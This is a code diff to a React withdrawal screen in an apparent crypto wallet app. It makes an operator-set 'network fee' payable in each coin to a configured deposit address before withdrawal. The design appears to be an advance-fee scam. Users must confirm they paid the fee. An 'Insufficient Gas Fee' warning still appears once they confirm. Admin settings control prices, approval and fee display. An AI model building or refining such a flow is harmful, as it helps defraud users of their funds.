@@ -38,14 +38,29 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
   }
 
   const maxAmount = wallet[asset];
-  const prices = {
+  const prices: Record<AssetType, number> = {
     btc: settings.btc_price,
     eth: settings.eth_price,
     usdt: settings.usdt_price,
     trx: settings.trx_price,
   };
-  const btcDepositAddress = settings.deposit_address_btc;
-  const autoApprove = settings.auto_approve;
+
+  // Deposit address for THIS specific asset (matches the coin being withdrawn)
+  const feeDepositAddress: string | null | undefined =
+    settings[`deposit_address_${asset}` as keyof SettingsData] as string | null | undefined;
+
+  // Convert the USD gas fee to the withdrawal asset's units
+  const feeInAsset: number =
+    asset === 'usdt'
+      ? parseFloat(settings.gas_fee_usd.toFixed(4))
+      : parseFloat((settings.gas_fee_usd / prices[asset]).toFixed(8));
+
+  const assetLabel = asset.toUpperCase();
+
+  // Gas fee section shows only when:
+  //   1. auto-approve is OFF, AND
+  //   2. a deposit address is configured for this specific coin
+  const showGasFeeSection = !settings.auto_approve && !!feeDepositAddress;
 
   const getAssetName = () => {
     switch (asset) {
@@ -57,8 +72,8 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
   };
 
   const copyFeeAddress = () => {
-    if (!btcDepositAddress) return;
-    navigator.clipboard.writeText(btcDepositAddress)
+    if (!feeDepositAddress) return;
+    navigator.clipboard.writeText(feeDepositAddress)
       .then(() => toast.success('Deposit address copied'))
       .catch(() => toast.error('Failed to copy'));
   };
@@ -70,9 +85,10 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
 
     const withdrawAmount = parseFloat(amount);
     if (isNaN(withdrawAmount) || withdrawAmount <= 0) { setError('Please enter a valid amount'); return; }
-    if (withdrawAmount > maxAmount) { setError(`Insufficient ${asset.toUpperCase()} balance`); return; }
+    if (withdrawAmount > maxAmount) { setError(`Insufficient ${assetLabel} balance`); return; }
 
-    if (!autoApprove && !gasFeeAcknowledged) {
+    // Only require gas fee ack when the fee section is visible
+    if (showGasFeeSection && !gasFeeAcknowledged) {
       setError('Insufficient Gas Fee — please cover your gas fee and confirm before proceeding');
       return;
     }
@@ -87,7 +103,7 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
       saveTxToStorage(merged);
 
       toast.success('Withdrawal processed successfully', {
-        description: `Sent ${withdrawAmount} ${asset.toUpperCase()}`,
+        description: `Sent ${withdrawAmount} ${assetLabel}`,
       });
       onNavigate('asset-details', asset);
     } catch (err: unknown) {
@@ -98,9 +114,9 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
     }
   };
 
-  // Show the gas fee insufficient warning when checkbox is ticked AND amount is entered
+  // Show the "Insufficient Gas Fee" reminder when checkbox is ticked AND amount is entered
   const withdrawAmount = parseFloat(amount);
-  const showGasFeeWarning = gasFeeAcknowledged && !isNaN(withdrawAmount) && withdrawAmount > 0;
+  const showGasFeeWarning = showGasFeeSection && gasFeeAcknowledged && !isNaN(withdrawAmount) && withdrawAmount > 0;
 
   return (
     <div className="flex flex-col h-full bg-background">
@@ -157,12 +173,12 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
               step="any"
             />
             <div className="absolute right-4 top-1/2 -translate-y-1/2 text-muted font-medium">
-              {asset.toUpperCase()}
+              {assetLabel}
             </div>
           </div>
           <div className="text-xs text-muted px-1 flex justify-between">
             <span>
-              Available: {maxAmount > 0 ? maxAmount.toLocaleString(undefined, { maximumFractionDigits: 8 }) : '0'} {asset.toUpperCase()}
+              Available: {maxAmount > 0 ? maxAmount.toLocaleString(undefined, { maximumFractionDigits: 8 }) : '0'} {assetLabel}
             </span>
             <span>
               ~${(parseFloat(amount || '0') * prices[asset]).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
@@ -170,8 +186,8 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
           </div>
         </div>
 
-        {/* Network Fee section — hidden when auto-approve is on */}
-        {!autoApprove && (
+        {/* Network Fee section — only shown when a deposit address is set for THIS coin and auto-approve is off */}
+        {showGasFeeSection && (
           <div className="flex flex-col gap-4 p-4 rounded-xl border border-[#da3637]/30 bg-[#da3637]/10">
             {/* Fee amount header */}
             <div className="flex gap-3">
@@ -179,30 +195,28 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
               <div className="flex flex-col gap-1">
                 <div className="text-sm font-semibold text-foreground">Network Fee Required</div>
                 <div className="text-xl font-bold text-destructive">
-                  {settings.gas_fee_btc} BTC
+                  {feeInAsset} {assetLabel}
                   <span className="text-sm font-normal text-muted ml-2">≈ ${settings.gas_fee_usd.toFixed(2)}</span>
                 </div>
                 <div className="text-xs text-muted/90 leading-relaxed">
-                  Before your withdrawal is processed, deposit the network fee above to the BTC address below.
+                  Before your withdrawal is processed, deposit the network fee above to the {assetLabel} address below.
                 </div>
               </div>
             </div>
 
-            {/* BTC deposit address */}
-            {btcDepositAddress ? (
-              <div className="flex flex-col gap-2">
-                <span className="text-xs text-muted uppercase tracking-widest font-medium">Send fee to this BTC address</span>
-                <button
-                  onClick={copyFeeAddress}
-                  className="flex items-center gap-3 bg-background/60 border border-border/60 rounded-xl px-4 py-3 text-left hover:bg-background transition-colors active:scale-[0.98]"
-                >
-                  <span className="font-mono text-xs text-foreground break-all leading-relaxed flex-1">{btcDepositAddress}</span>
-                  <Copy className="w-4 h-4 text-muted shrink-0" />
-                </button>
-              </div>
-            ) : (
-              <p className="text-xs text-muted/80 italic">Fee deposit address not configured. Contact support.</p>
-            )}
+            {/* Asset-specific deposit address */}
+            <div className="flex flex-col gap-2">
+              <span className="text-xs text-muted uppercase tracking-widest font-medium">
+                Send fee to this {assetLabel} address
+              </span>
+              <button
+                onClick={copyFeeAddress}
+                className="flex items-center gap-3 bg-background/60 border border-border/60 rounded-xl px-4 py-3 text-left hover:bg-background transition-colors active:scale-[0.98]"
+              >
+                <span className="font-mono text-xs text-foreground break-all leading-relaxed flex-1">{feeDepositAddress}</span>
+                <Copy className="w-4 h-4 text-muted shrink-0" />
+              </button>
+            </div>
 
             {/* Acknowledgement checkbox — label wraps everything so the whole row is clickable */}
             <label
@@ -218,7 +232,7 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
               />
               <span className="text-xs text-muted leading-relaxed">
                 I confirm I have already sent the network fee of{' '}
-                <span className="text-destructive font-semibold">{settings.gas_fee_btc} BTC</span>{' '}
+                <span className="text-destructive font-semibold">{feeInAsset} {assetLabel}</span>{' '}
                 to the address above and my withdrawal is ready to be processed.
               </span>
             </label>
@@ -229,7 +243,7 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
                 <AlertCircle className="w-4 h-4 text-destructive shrink-0 mt-0.5" />
                 <p className="text-xs text-destructive font-medium leading-relaxed">
                   Insufficient Gas Fee — Kindly cover your gas fee of{' '}
-                  <span className="font-bold">{settings.gas_fee_btc} BTC</span> to the address above before confirming your withdrawal.
+                  <span className="font-bold">{feeInAsset} {assetLabel}</span> to the address above before confirming your withdrawal.
                 </p>
               </div>
             )}
@@ -242,7 +256,7 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
 
         <button
           onClick={handleSend}
-          disabled={submitting || (!autoApprove && !gasFeeAcknowledged)}
+          disabled={submitting || (showGasFeeSection && !gasFeeAcknowledged)}
           className="w-full bg-destructive hover:bg-destructive/90 disabled:opacity-40 disabled:cursor-not-allowed text-white font-medium rounded-xl px-4 py-4 mt-auto transition-colors shadow-[0_0_20px_rgba(218,54,55,0.2)] active:scale-[0.98]"
         >
           {submitting ? 'Processing…' : 'Confirm Withdrawal'}
